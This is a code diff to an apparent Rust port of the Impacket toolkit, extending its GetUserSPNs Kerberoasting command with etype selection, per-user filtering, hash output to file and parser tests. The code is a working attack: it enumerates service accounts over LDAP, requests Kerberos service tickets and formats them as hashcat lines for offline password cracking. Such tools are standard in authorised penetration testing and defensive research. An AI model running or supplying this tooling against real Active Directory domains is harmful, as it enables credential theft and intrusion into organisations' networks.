@@ -5871,27 +5871,28 @@ fn cmd_get_tgt(args: &[String]) {
     }
 }
 
-fn cmd_get_user_spns(args: &[String]) {
-    print!("{}", version::BANNER);
-    if args.is_empty() {
-        eprintln!("Usage: impacket-rs GetUserSPNs <TARGET> [-request] [-save] [-spn <spn>] [-dc-ip <ip>] [-port <port>]");
-        eprintln!("       impacket-rs GetUserSPNs domain/user:password@target-ip -request");
-        std::process::exit(1);
-    }
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct GetUserSpnsOptions {
+    pub do_request: bool,
+    pub do_save: bool,
+    pub target_spn: Option<String>,
+    pub target_user: Option<String>,
+    pub output_file: Option<String>,
+    pub dc_ip: Option<String>,
+    pub port: u16,
+    pub requested_etypes: Vec<KerberosEType>,
+}
 
-    let spec = match parse_target_with_hashes(args) {
-        Ok(s) => s,
-        Err(e) => {
-            eprintln!("[-] Error parsing target: {}", e);
-            std::process::exit(1);
-        }
-    };
-
+pub fn parse_get_user_spns_options(args: &[String]) -> Result<GetUserSpnsOptions, String> {
     let mut do_request = false;
     let mut do_save = false;
-    let mut target_spn: Option<String> = None;
-    let mut dc_ip: Option<String> = None;
+    let mut target_spn = None;
+    let mut target_user = None;
+    let mut output_file = None;
+    let mut dc_ip = None;
     let mut port: u16 = 389;
+    let mut requested_etypes = vec![KerberosEType::Rc4Hmac];
+    let mut explicit_etype = false;
 
     let mut i = 1;
     while i < args.len() {
@@ -5908,6 +5909,51 @@ fn cmd_get_user_spns(args: &[String]) {
                 target_spn = Some(args[i + 1].clone());
                 i += 2;
             }
+            "-request-user" | "-user" if i + 1 < args.len() => {
+                target_user = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-outputfile" | "-output-file" | "-o" if i + 1 < args.len() => {
+                output_file = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-aes" => {
+                if !explicit_etype {
+                    requested_etypes = vec![
+                        KerberosEType::Aes256CtsHmacSha1_96,
+                        KerberosEType::Aes128CtsHmacSha1_96,
+                    ];
+                }
+                i += 1;
+            }
+            "-etype" if i + 1 < args.len() => {
+                explicit_etype = true;
+                match args[i + 1].to_lowercase().as_str() {
+                    "rc4" | "23" => requested_etypes = vec![KerberosEType::Rc4Hmac],
+                    "aes128" | "17" => requested_etypes = vec![KerberosEType::Aes128CtsHmacSha1_96],
+                    "aes256" | "18" => requested_etypes = vec![KerberosEType::Aes256CtsHmacSha1_96],
+                    "aes" => {
+                        requested_etypes = vec![
+                            KerberosEType::Aes256CtsHmacSha1_96,
+                            KerberosEType::Aes128CtsHmacSha1_96,
+                        ];
+                    }
+                    "all" => {
+                        requested_etypes = vec![
+                            KerberosEType::Rc4Hmac,
+                            KerberosEType::Aes256CtsHmacSha1_96,
+                            KerberosEType::Aes128CtsHmacSha1_96,
+                        ];
+                    }
+                    other => {
+                        return Err(format!(
+                            "Unknown Kerberos etype '{}' (expected: rc4, aes128, aes256, aes, all)",
+                            other
+                        ));
+                    }
+                }
+                i += 2;
+            }
             "-dc-ip" if i + 1 < args.len() => {
                 dc_ip = Some(args[i + 1].clone());
                 i += 2;
@@ -5922,8 +5968,47 @@ fn cmd_get_user_spns(args: &[String]) {
         }
     }
 
-    let kdc_host = dc_ip.as_deref().unwrap_or_else(|| spec.effective_target_ip());
-    let addr = format!("{}:{}", kdc_host, port);
+    Ok(GetUserSpnsOptions {
+        do_request,
+        do_save,
+        target_spn,
+        target_user,
+        output_file,
+        dc_ip,
+        port,
+        requested_etypes,
+    })
+}
+
+fn cmd_get_user_spns(args: &[String]) {
+    print!("{}", version::BANNER);
+    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
+        eprintln!("Usage: impacket-rs GetUserSPNs <TARGET> [-request] [-aes] [-etype <rc4|aes128|aes256|all>] [-user <name>] [-spn <spn>] [-outputfile <file>] [-save] [-dc-ip <ip>] [-port <port>]");
+        eprintln!("       impacket-rs GetUserSPNs domain/user:password@target-ip -request -outputfile hashes.txt");
+        if args.iter().any(|a| a == "-h" || a == "--help") {
+            return;
+        }
+        std::process::exit(1);
+    }
+
+    let spec = match parse_target_with_hashes(args) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] Error parsing target: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let opts = match parse_get_user_spns_options(args) {
+        Ok(o) => o,
+        Err(e) => {
+            eprintln!("[-] Error parsing GetUserSPNs options: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let kdc_host = opts.dc_ip.as_deref().unwrap_or_else(|| spec.effective_target_ip());
+    let addr = format!("{}:{}", kdc_host, opts.port);
 
     println!("[*] Connecting to LDAP server at {}...", addr);
     let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
@@ -6020,6 +6105,11 @@ fn cmd_get_user_spns(args: &[String]) {
         }
 
         if (uac & 0x0002) == 0 && !sam.is_empty() && !spns.is_empty() {
+            if let Some(ref filter_user) = opts.target_user {
+                if !sam.eq_ignore_ascii_case(filter_user) {
+                    continue;
+                }
+            }
             accounts.push(SpnAccount {
                 sam_name: sam,
                 spns,
@@ -6039,7 +6129,7 @@ fn cmd_get_user_spns(args: &[String]) {
     }
     println!();
 
-    if !do_request {
+    if !opts.do_request {
         return;
     }
 
@@ -6086,7 +6176,7 @@ fn cmd_get_user_spns(args: &[String]) {
 
     for acc in &accounts {
         for spn in &acc.spns {
-            if let Some(ref filter_spn) = target_spn {
+            if let Some(ref filter_spn) = opts.target_spn {
                 if !spn.eq_ignore_ascii_case(filter_spn) {
                     continue;
                 }
@@ -6100,7 +6190,7 @@ fn cmd_get_user_spns(args: &[String]) {
                 &tgt_ticket,
                 &session_key,
                 session_key_etype,
-                &[KerberosEType::Rc4Hmac],
+                &opts.requested_etypes,
             );
 
             match get_tgs_live(kdc_host, 88, &tgs_req, now_unix, DEFAULT_TIMEOUT) {
@@ -6108,14 +6198,41 @@ fn cmd_get_user_spns(args: &[String]) {
                     match tgs_rep.to_hashcat_format(&acc.sam_name, spn) {
                         Some(hashcat_line) => {
                             println!("{}", hashcat_line);
+                            if let Some(ref out_file) = opts.output_file {
+                                use std::io::Write;
+                                match std::fs::OpenOptions::new()
+                                    .create(true)
+                                    .append(true)
+                                    .open(out_file)
+                                {
+                                    Ok(mut f) => {
+                                        if let Err(e) = writeln!(f, "{}", hashcat_line) {
+                                            eprintln!("[-] Error writing to '{}': {}", out_file, e);
+                                        } else {
+                                            println!("[+] Appended hashcat ticket to '{}'", out_file);
+                                        }
+                                    }
+                                    Err(e) => {
+                                        eprintln!("[-] Failed opening output file '{}': {}", out_file, e);
+                                    }
+                                }
+                            }
                         }
                         None => {
-                            eprintln!("[-] Unable to format Hashcat string for ticket etype {}", tgs_rep.ticket_enc_etype);
+                            eprintln!(
+                                "[-] Unable to format Hashcat string for ticket etype {}",
+                                tgs_rep.ticket_enc_etype
+                            );
                         }
                     }
 
-                    if do_save {
-                        let ccache = tgs_rep.to_ccache(&spec.domain, &spec.username, &session_key, session_key_etype as u16);
+                    if opts.do_save {
+                        let ccache = tgs_rep.to_ccache(
+                            &spec.domain,
+                            &spec.username,
+                            &session_key,
+                            session_key_etype as u16,
+                        );
                         let file_name = format!("{}.ccache", acc.sam_name);
                         match std::fs::write(&file_name, ccache.to_bytes()) {
                             Ok(()) => println!("[+] Saved ticket to '{}'", file_name),
@@ -13341,5 +13458,64 @@ mod tests {
 
         let stub = build_backupr_key_stub(&BACKUPKEY_RETRIEVE_BACKUP_KEY_GUID, None, 0);
         assert!(!stub.is_empty());
+    }
+
+    #[test]
+    fn test_parse_get_user_spns_options() {
+        let args_default = vec!["corp/user:pass@10.0.0.1".to_string()];
+        let opts_default = parse_get_user_spns_options(&args_default).unwrap();
+        assert!(!opts_default.do_request);
+        assert_eq!(opts_default.requested_etypes, vec![KerberosEType::Rc4Hmac]);
+        assert!(opts_default.target_user.is_none());
+        assert!(opts_default.output_file.is_none());
+
+        let args_aes = vec![
+            "corp/user:pass@10.0.0.1".to_string(),
+            "-request".to_string(),
+            "-aes".to_string(),
+            "-outputfile".to_string(),
+            "hashes.txt".to_string(),
+            "-user".to_string(),
+            "sql_svc".to_string(),
+            "-spn".to_string(),
+            "MSSQLSvc/db.corp.local:1433".to_string(),
+        ];
+        let opts_aes = parse_get_user_spns_options(&args_aes).unwrap();
+        assert!(opts_aes.do_request);
+        assert_eq!(
+            opts_aes.requested_etypes,
+            vec![
+                KerberosEType::Aes256CtsHmacSha1_96,
+                KerberosEType::Aes128CtsHmacSha1_96,
+            ]
+        );
+        assert_eq!(opts_aes.output_file.as_deref(), Some("hashes.txt"));
+        assert_eq!(opts_aes.target_user.as_deref(), Some("sql_svc"));
+        assert_eq!(
+            opts_aes.target_spn.as_deref(),
+            Some("MSSQLSvc/db.corp.local:1433")
+        );
+
+        let args_all = vec![
+            "target".to_string(),
+            "-etype".to_string(),
+            "all".to_string(),
+        ];
+        let opts_all = parse_get_user_spns_options(&args_all).unwrap();
+        assert_eq!(
+            opts_all.requested_etypes,
+            vec![
+                KerberosEType::Rc4Hmac,
+                KerberosEType::Aes256CtsHmacSha1_96,
+                KerberosEType::Aes128CtsHmacSha1_96,
+            ]
+        );
+
+        let args_bad = vec![
+            "target".to_string(),
+            "-etype".to_string(),
+            "invalid".to_string(),
+        ];
+        assert!(parse_get_user_spns_options(&args_bad).is_err());
     }
 }
